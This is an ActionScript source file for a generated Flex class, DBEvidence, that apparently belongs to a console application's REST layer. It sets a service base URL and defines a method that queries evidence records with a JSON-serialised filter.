/**
 * This is a generated sub-class of _DBEvidence.as and is intended for behavior
 * customization.  This class is only generated when there is no file already present
 * at its target location.  Thus custom behavior that you add here will survive regeneration
 * of the super-class. 
 **/
 
package it.ht.rcs.console.evidence.rest
{
  
  
  import it.ht.rcs.console.DB;
  
  import mx.rpc.CallResponder;

public class DBEvidence extends _Super_DBEvidence implements IDBEvidence
{
    /**
     * Override super.init() to provide any initialization customization if needed.
     */
    protected override function preInitializeService():void
    {
        super.preInitializeService();
        // Initialization customization goes here
    }
        
    public function DBEvidence(host: String) {
      super();
      _serviceControl.baseURL = host;
    }
    
    public function all(filter:Object, onResult:Function=null, onFault:Function=null):void
    {
      var resp:CallResponder = DB.getCallResponder(onResult, onFault);
      resp.token = all_(JSON.stringify(filter));
    }
}

}
